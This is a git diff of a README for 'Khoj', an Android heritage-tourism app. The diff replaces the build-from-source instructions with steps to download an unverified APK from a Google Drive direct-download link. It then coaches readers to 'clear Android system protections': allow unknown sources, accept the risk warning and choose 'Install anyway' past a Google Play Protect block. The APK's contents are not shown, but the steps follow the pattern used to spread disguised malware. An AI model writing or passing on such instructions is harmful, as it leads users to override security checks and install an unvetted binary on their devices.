@@ -49,25 +49,15 @@ An interactive, immersive Android application that transforms historical monumen
 
 ## ⚙️ How to Build and Run Locally
 
-### Prerequisites
-- Android Studio Ladybug (or newer versions).
-- Android SDK 34 (Upside Down Cake or higher).
-- A valid Gemini API Key from [Google AI Studio](https://aistudio.google.com/).
-
-### Setup Steps
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/YOUR_USERNAME/khoj-heritage-app.git
-   cd khoj-heritage-app
-Open the project in Android Studio.
-Add your Gemini API key:
-In Android Studio, go to the top-level root directory and locate or create a .env file or export your system environment variables.
-Insert your key:
-code
-Env
-GEMINI_API_KEY=your_actual_gemini_api_key_here
-Gradle will automatically sync configurations and expose BuildConfig.GEMINI_API_KEY to the application.
-Click Run on Android Studio to deploy the application onto your emulator or connected physical Android device.
+Because this package is a fresh development build compiled straight from the workspace and has not yet been processed through public store channels, Android will trigger default sandbox warnings. Please use the following verified steps to install and review the live app seamlessly:
+-*Step 1:*  Download the Source Package
+Click the direct distribution link below to bypass standard cloud file previews and trigger an instant .apk file download to your device: https://docs.google.com/uc?export=download&id=1Khu0NiKL-TluRfNyiuVMz4XCZzEy5TGK
+-*Step 2:*  Clear Android System Protections
+1.	Locate the downloaded file app-debug.apk in your device's Downloads folder and tap it.
+2.	If prompted about installing from "Unknown Sources", tap Settings and toggle "Allow from this source" to On.
+3.	On the subsequent warning overlay, check the box acknowledging awareness of potential risks and press OK.
+4.	When the blue Google Play Protect block card appears, click the small dropdown text that reads "More details" and select "Install anyway".
+5.	Once the process completes, select Open to initialize Khoj.
 
 ### 🏛️ Project Motivation
 Pakistan contains thousands of years of human civilization layers (including Mohenjo-daro, Harappa, Taxila civilizations,
